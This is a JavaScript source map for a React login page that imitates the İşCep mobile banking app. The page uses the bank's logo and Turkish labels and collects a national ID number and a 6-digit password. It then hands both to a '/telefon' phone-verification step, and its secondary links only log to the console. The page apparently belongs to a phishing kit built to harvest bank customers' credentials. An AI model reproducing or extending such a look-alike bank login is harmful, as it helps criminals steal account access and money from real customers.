{"version":3,"file":"static/js/398.b065b0b2.chunk.js","mappings":"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","sources":["LoginPage.js"],"sourcesContent":["import React, { useEffect, useRef, useCallback, memo } from 'react';\nimport { useNavigate, useLocation } from 'react-router-dom';\nimport './App.css';\nimport { useAuth } from './AuthContext';\n\nfunction LoginPage() {\n  const { state, dispatch } = useAuth();\n  const { inputValue = '', passwordValue = '' } = state || {};\n  const passwordInputRef = useRef(null);\n  const tcInputRef = useRef(null);\n  const navigate = useNavigate();\n  const location = useLocation();\n\n  const [localState, setLocalState] = React.useState({\n    isTcActive: inputValue.length > 0,\n    isActive: passwordValue.length > 0,\n    isTcBold: inputValue.length > 0,\n    showTcError: false,\n  });\n\n  useEffect(() => {\n    if (location.state?.fromPhoneVerification) {\n      window.history.replaceState(null, '', '/giris');\n      navigate('/giris', { replace: true });\n    }\n    if (inputValue.length === 11 && passwordInputRef.current) {\n      passwordInputRef.current.focus();\n    }\n  }, [inputValue, location.state, navigate]);\n\n  const handleNumberInput = useCallback((e, type, maxLength) => {\n    const value = e.target.value;\n    if (/^\\d*$/.test(value) && value.length <= maxLength) {\n      dispatch({ type, payload: value });\n      setLocalState((prev) => ({\n        ...prev,\n        ...(type === 'SET_INPUT_VALUE'\n          ? { isTcActive: true, isTcBold: value.length > 0, showTcError: false }\n          : { isActive: true, showTcError: false }),\n      }));\n    }\n  }, [dispatch]);\n\n  const handleTcKeyDown = useCallback((e) => {\n    if ((e.key === 'Backspace' || e.key === 'Delete') && !e.target.value) {\n      setLocalState((prev) => ({\n        ...prev,\n        isTcBold: false,\n        isTcActive: true,\n      }));\n    }\n  }, []);\n\n  const handleClearTc = useCallback((e) => {\n    e.stopPropagation();\n    dispatch({ type: 'CLEAR_TC' });\n    setLocalState((prev) => ({\n      ...prev,\n      isTcActive: true,\n      isTcBold: false,\n      showTcError: false,\n    }));\n    tcInputRef.current?.focus();\n  }, [dispatch]);\n\n  const handleClearPassword = useCallback((e) => {\n    e.stopPropagation();\n    dispatch({ type: 'CLEAR_PASSWORD' });\n    setLocalState((prev) => ({\n      ...prev,\n      isActive: true,\n      showTcError: false,\n    }));\n    passwordInputRef.current?.focus();\n  }, [dispatch]);\n\n  const handleTcFocus = useCallback(() => {\n    setLocalState((prev) => ({\n      ...prev,\n      isTcActive: true,\n      isTcBold: inputValue.length > 0,\n    }));\n  }, [inputValue]);\n\n  const handleTcBlur = useCallback(() => {\n    if (!inputValue.length) {\n      setLocalState((prev) => ({\n        ...prev,\n        isTcActive: false,\n        isTcBold: false,\n      }));\n    }\n  }, [inputValue]);\n\n  const handlePasswordFocus = useCallback(() => {\n    setLocalState((prev) => ({ ...prev, isActive: true }));\n  }, []);\n\n  const handlePasswordBlur = useCallback((e) => {\n    const isClearButton = e.relatedTarget?.classList.contains('clear-password-button');\n    if (!passwordValue.length && !isClearButton) {\n      setLocalState((prev) => ({ ...prev, isActive: false }));\n    }\n  }, [passwordValue]);\n\n  const handleContinueClick = useCallback(() => {\n    if (inputValue.length > 0 && inputValue.length !== 11) {\n      setLocalState((prev) => ({ ...prev, showTcError: true }));\n      return;\n    }\n    if (inputValue.length === 11 && passwordValue.length === 6) {\n      navigate('/telefon', {\n        state: { tc: inputValue, password: passwordValue, isValidNavigation: true },\n        replace: true,\n      });\n    }\n  }, [inputValue, passwordValue, navigate]);\n\n  const getDotColor = useCallback((index, length) => {\n    const startColor = [200, 220, 255];\n    const endColor = [74, 126, 219];\n    return index < length\n      ? `rgb(${endColor.join(',')})`\n      : `rgb(${startColor.join(',')})`;\n  }, []);\n\n  return (\n    <div className=\"container\" style={{ touchAction: 'manipulation' }}>\n      <div className=\"right-section\">\n        <img src=\"/iscep-logo.png\" alt=\"İşCep Logosu\" className=\"iscep-logo\" loading=\"lazy\" />\n        <div className=\"user-icon\">\n          <img src=\"/user.png\" alt=\"Kullanıcı Simgesi\" loading=\"lazy\" />\n        </div>\n        <div className=\"new-container\">\n          Yeni Kullanıcı\n          <div className=\"down-arrow\">\n            <img src=\"/down-arrow.png\" alt=\"Aşağı Ok\" className=\"down-arrow-img\" loading=\"lazy\" />\n          </div>\n        </div>\n        <div className=\"new-lower-container\">Bireysel</div>\n        <div className=\"input-wrapper\">\n          <div\n            className={`tc-input-wrapper ${localState.showTcError ? 'error' : ''}`}\n            onClick={() => tcInputRef.current?.focus()}\n          >\n            <label\n              className={`tc-label ${localState.isTcActive ? 'hovered' : ''}`}\n              htmlFor=\"tc-input\"\n            >\n              Müşteri Numarası /{' '}\n              <span className={`tc-label-part ${localState.isTcBold ? 'bold' : ''}`}>\n                TCKN-YKN\n              </span>\n            </label>\n            <input\n              id=\"tc-input\"\n              ref={tcInputRef}\n              type=\"tel\"\n              inputMode=\"numeric\"\n              pattern=\"[0-9]*\"\n              maxLength=\"11\"\n              value={inputValue}\n              onChange={(e) => handleNumberInput(e, 'SET_INPUT_VALUE', 11)}\n              onFocus={handleTcFocus}\n              onBlur={handleTcBlur}\n              onKeyDown={handleTcKeyDown}\n              className={`new-input tc-input ${localState.showTcError ? 'error' : ''}`}\n              autoComplete=\"off\"\n              autoCapitalize=\"none\"\n              aria-describedby=\"tc-error\"\n              aria-label=\"Müşteri Numarası veya TCKN-YKN\"\n            />\n            {inputValue.length > 0 && (\n              <button\n                className=\"clear-tc-button\"\n                onClick={handleClearTc}\n                onTouchStart={handleClearTc}\n                aria-label=\"TCKN-YKN’yi temizle\"\n              >\n                ✕\n              </button>\n            )}\n            {localState.showTcError && (\n              <div id=\"tc-error\" className=\"tc-error\" role=\"alert\" aria-live=\"assertive\">\n                <img src=\"/error.png\" alt=\"Hata Simgesi\" className=\"error-icon\" loading=\"lazy\" onError={() => console.warn('Hata simgesi yüklenemedi')} />\n                Hatalı giriş yaptınız, lütfen tekrar deneyiniz.\n              </div>\n            )}\n          </div>\n          <div\n            className={`action-links ${inputValue.length === 11 ? 'shifted' : ''} ${\n              localState.showTcError ? 'error-shifted' : ''\n            }`}\n          >\n            <button\n              className=\"action-link become-customer\"\n              onClick={() => console.log('Müşteri Olmak İstiyorum tıklandı')}\n            >\n              MÜŞTERİ OLMAK İSTİYORUM\n            </button>\n            <button\n              className=\"action-link create-password\"\n              onClick={() => console.log('Şifre Oluştur tıklandı')}\n            >\n              ŞİFRE OLUŞTUR\n            </button>\n          </div>\n          {inputValue.length === 11 && (\n            <div className=\"password-input-wrapper\">\n              <label\n                className={`password-label ${localState.isActive ? 'hovered' : ''}`}\n                htmlFor=\"password-input\"\n              >\n                Şifre\n              </label>\n              <div className=\"password-input-container\">\n                <input\n                  id=\"password-input\"\n                  ref={passwordInputRef}\n                  type=\"password\"\n                  inputMode=\"numeric\"\n                  pattern=\"[0-9]*\"\n                  maxLength=\"6\"\n                  value={passwordValue}\n                  onChange={(e) => handleNumberInput(e, 'SET_PASSWORD_VALUE', 6)}\n                  onFocus={handlePasswordFocus}\n                  onBlur={handlePasswordBlur}\n                  className={`new-input password-input ${\n                    inputValue.length === 11 ? 'no-right-line' : ''\n                  }`}\n                  autoComplete=\"new-password\"\n                  autoCapitalize=\"none\"\n                  aria-describedby=\"password-error\"\n                  aria-label=\"Şifre\"\n                />\n                {passwordValue.length > 0 && (\n                  <button\n                    className=\"clear-password-button\"\n                    onClick={handleClearPassword}\n                    onTouchStart={handleClearPassword}\n                    aria-label=\"Şifreyi temizle\"\n                  >\n                    ✕\n                  </button>\n                )}\n              </div>\n              {(passwordValue.length > 0 || localState.isActive) && (\n                <div className=\"password-overlay\">\n                  <span className=\"dots\">\n                    {[...Array(6)].map((_, index) => (\n                      <span\n                        key={index}\n                        className=\"dot\"\n                        style={{ color: getDotColor(index, passwordValue.length) }}\n                      >\n                        ●\n                      </span>\n                    ))}\n                  </span>\n                </div>\n              )}\n            </div>\n          )}\n          <button\n            className={`continue-button ${\n              inputValue.length > 0 && (inputValue.length < 11 || (inputValue.length === 11 && passwordValue.length === 6))\n                ? 'active-continue-button'\n                : ''\n            } ${inputValue.length === 11 ? 'shifted' : ''} ${\n              localState.showTcError ? 'error-shifted' : ''\n            }`}\n            onClick={handleContinueClick}\n            disabled={inputValue.length === 0 || (inputValue.length === 11 && passwordValue.length !== 6)}\n            aria-label=\"Devam et\"\n          >\n            Devam\n          </button>\n        </div>\n      </div>\n    </div>\n  );\n}\n\nexport default memo(LoginPage);"],"names":["LoginPage","state","dispatch","useAuth","inputValue","passwordValue","passwordInputRef","useRef","tcInputRef","navigate","useNavigate","location","useLocation","localState","setLocalState","React","isTcActive","length","isActive","isTcBold","showTcError","useEffect","_location$state","fromPhoneVerification","window","history","replaceState","replace","current","focus","handleNumberInput","useCallback","e","type","maxLength","value","target","test","payload","prev","_objectSpread","handleTcKeyDown","key","handleClearTc","_tcInputRef$current","stopPropagation","handleClearPassword","_passwordInputRef$cur","handleTcFocus","handleTcBlur","handlePasswordFocus","handlePasswordBlur","_e$relatedTarget","isClearButton","relatedTarget","classList","contains","handleContinueClick","tc","password","isValidNavigation","getDotColor","index","concat","join","_jsx","className","style","touchAction","children","_jsxs","src","alt","loading","onClick","_tcInputRef$current2","htmlFor","id","ref","inputMode","pattern","onChange","onFocus","onBlur","onKeyDown","autoComplete","autoCapitalize","onTouchStart","role","onError","console","warn","log","Array","map","_","color","disabled","memo"],"sourceRoot":""}